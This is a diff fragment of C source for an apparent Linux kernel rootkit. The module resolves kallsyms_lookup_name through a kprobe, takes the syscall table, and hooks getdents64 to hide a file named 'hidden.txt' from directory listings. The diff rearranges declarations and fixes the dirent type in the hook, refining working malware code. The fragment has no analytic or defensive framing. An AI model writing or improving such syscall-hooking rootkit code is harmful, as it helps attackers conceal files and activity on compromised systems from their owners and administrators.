@@ -6,21 +6,20 @@
 
 #define HIDE_ME "hidden.txt"
 
-static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"
-};
-
-MODULE_LICENSE("GPL");
-
 typedef long (*getdents64_t)(const struct pt_regs *pt_registers);
 getdents64_t org_getdents64;
 unsigned long * syscall_table;
 
+MODULE_LICENSE("GPL");
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
 asmlinkage long sys_getdents64_hook(const struct pt_regs *pt_registers) {
   int ret = org_getdents64(pt_registers);
   int err;
   struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-  struct linux_dirent *dirent = (struct linux_dirent *) pt_registers->si;
+  struct linux_dirent64 *dirent = (struct linux_dirent64 *) pt_registers->si;
   unsigned long i = 0;
 
   if (ret <= 0) {
